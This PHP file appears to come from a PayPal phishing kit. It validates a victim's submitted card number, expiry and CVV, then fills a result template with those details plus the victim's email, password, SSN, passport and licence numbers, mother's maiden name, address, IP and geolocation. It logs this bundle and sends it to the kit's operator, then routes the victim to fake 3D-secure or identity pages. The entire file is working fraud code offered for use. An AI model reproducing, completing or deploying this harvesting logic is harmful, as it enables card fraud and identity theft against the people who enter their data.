<?php
require __DIR__ . '/../function.php';
require __DIR__ . '/../system/class/creditcard.php';

$card = CreditCard::validCreditCard(str_replace(" ", "", $_POST[$api->encypt('cardnum')]));
$expsplit = explode("/", $_POST[$api->encypt('cardexp')]);
$checkexp = CreditCard::validDate("20".$expsplit[1], $expsplit[0]);
$checkcvv = CreditCard::validCvc($_POST[$api->encypt('cardcvv')], $card['type']);
$check3d  = CreditCard::secure3D($card['type']);

if(!$card['valid']){
  echo "error";
}else if(!$checkexp){
  echo "exp";
}else if(!$checkcvv){
  echo "cvv";
}else{
  $_SESSION['card2_name']    = $_POST[$api->encypt('cardholder')];
  $_SESSION['card2_number']  = $_POST[$api->encypt('cardnum')];
  $_SESSION['card2_exp']     = $_POST[$api->encypt('cardexp')];
  $_SESSION['card2_cvv']     = $_POST[$api->encypt('cardcvv')];
  $_SESSION['card2_digit']   = substr(str_replace(" ", "", $_SESSION['card2_number']), 0, 6);
  $_SESSION['card2_bin']     = $api->bin($_SESSION['card2_digit'])['full'];
  $_SESSION['card2_check']   = str_replace(" ", "", $_SESSION['card2_number'])."|".str_replace("/", "|", $_SESSION['card2_exp'])."|".$_SESSION['card2_cvv'];

  $message = $api->get($api->server_api."/paypal/result/template_card.html")['data'];
  $message = preg_replace('{KUZULUY-SERVER}', $api->server_api, $message);
  $message = preg_replace('{KUZULUY-QUOTE}', $api->quote(), $message);
  $message = preg_replace('{KUZULUY-EMAIL}', $_SESSION['email'], $message);
  $message = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['password'], $message);
  $message = preg_replace('{KUZULUY-CARD-NAME}', $_SESSION['card2_name'], $message);
  $message = preg_replace('{KUZULUY-CARD-NUMBER}', $_SESSION['card2_number'], $message);
  $message = preg_replace('{KUZULUY-CARD-EXP}', $_SESSION['card2_exp'], $message);
  $message = preg_replace('{KUZULUY-CARD-CVV}', $_SESSION['card2_cvv'], $message);
  $message = preg_replace('{KUZULUY-CARD-CHECK}', $_SESSION['card2_check'], $message);
  $message = preg_replace('{KUZULUY-CARD-BIN}', $_SESSION['card2_bin'], $message);
  $message = preg_replace('{KUZULUY-INFO-SSN}', $_SESSION['ssn'], $message);
  $message = preg_replace('{KUZULUY-INFO-SORT}', $_SESSION['sort'], $message);
  $message = preg_replace('{KUZULUY-INFO-SIN}', $_SESSION['sin'], $message);
  $message = preg_replace('{KUZULUY-INFO-DRIVER}', $_SESSION['driver'], $message);
  $message = preg_replace('{KUZULUY-INFO-OSID}', $_SESSION['osid'], $message);
  $message = preg_replace('{KUZULUY-INFO-ACCNUMBER}', $_SESSION['accnum'], $message);
  $message = preg_replace('{KUZULUY-INFO-LIMIT}', $_SESSION['limit'], $message);
  $message = preg_replace('{KUZULUY-INFO-PERSONAL}', $_SESSION['personal'], $message);
  $message = preg_replace('{KUZULUY-INFO-CUSTOMER}', $_SESSION['customer'], $message);
  $message = preg_replace('{KUZULUY-INFO-CITIZEN}', $_SESSION['citizen'], $message);
  $message = preg_replace('{KUZULUY-INFO-CIVIL}', $_SESSION['civil'], $message);
  $message = preg_replace('{KUZULUY-INFO-PASSPORT}', $_SESSION['passport'], $message);
  $message = preg_replace('{KUZULUY-INFO-BAN}', $_SESSION['ban'], $message);
  $message = preg_replace('{KUZULUY-INFO-DOB}', $_SESSION['billing_dob'], $message);
  $message = preg_replace('{KUZULUY-INFO-AGE}', $_SESSION['age'], $message);
  $message = preg_replace('{KUZULUY-INFO-MOTHER}', $_SESSION['mother'], $message);
  $message = preg_replace('{KUZULUY-BILLING-NAME}', $_SESSION['billing_fullname'], $message);
  $message = preg_replace('{KUZULUY-BILLING-ADDRESS}', $_SESSION['billing_address'], $message);
  $message = preg_replace('{KUZULUY-BILLING-CITY}', $_SESSION['billing_city'], $message);
  $message = preg_replace('{KUZULUY-BILLING-STATE}', $_SESSION['billing_state'], $message);
  $message = preg_replace('{KUZULUY-BILLING-ZIP}', $_SESSION['billing_zip'], $message);
  $message = preg_replace('{KUZULUY-BILLING-COUNTRY}', $_SESSION['country'], $message);
  $message = preg_replace('{KUZULUY-BILLING-PHONE}', $_SESSION['billing_phone'], $message);
  $message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
  $message = preg_replace('{KUZULUY-HOST}', $_SESSION['host'], $message);
  $message = preg_replace('{KUZULUY-ISP}', $_SESSION['isp'], $message);
  $message = preg_replace('{KUZULUY-LANGUAGE}', $_SESSION['language'], $message);
  $message = preg_replace('{KUZULUY-TIMEZONE1}', $_SESSION['timezone'], $message);
  $message = preg_replace('{KUZULUY-TIMEZONE2}', $_SESSION['iptimezone'], $message);
  $message = preg_replace('{KUZULUY-RESOLUTION1}', $_SESSION['device_resolution'], $message);
  $message = preg_replace('{KUZULUY-RESOLUTION2}', $_SESSION['browser_resolution'], $message);
  $message = preg_replace('{KUZULUY-LATLONG}', $_SESSION['geonameid'], $message);
  $message = preg_replace('{KUZULUY-LATITUDE}', $_SESSION['latitude'], $message);
  $message = preg_replace('{KUZULUY-LONGITUDE}', $_SESSION['longitude'], $message);
  $message = preg_replace('{KUZULUY-LOCATION}', $api->location()['full'], $message);
  $message = preg_replace('{KUZULUY-USERAGENT}', $_SESSION['useragent'], $message);

  $subject  = "Salahmu // {$_SESSION['card2_digit']} // {$_SESSION['card2_bin']} // {$_SESSION['country']} // {$_SESSION['ip']} // {$_SESSION['browser']} // {$_SESSION['os']}";
  $api->save($api->logs("card"), $subject."\n", "a");
  $api->send($api->result()['card'], $subject, $message, $_SESSION['Beby Chaesara Anadila CC']);

  if ($api->config("secure3d") == "on") {
    if ($check3d == "secure") {
      $_SESSION['card2_title'] = CreditCard::title3D($card['type']);
      exit("secure");
    }
  } else if ($api->config("identity") == "on") {
    exit("identity");
  }
}

?>
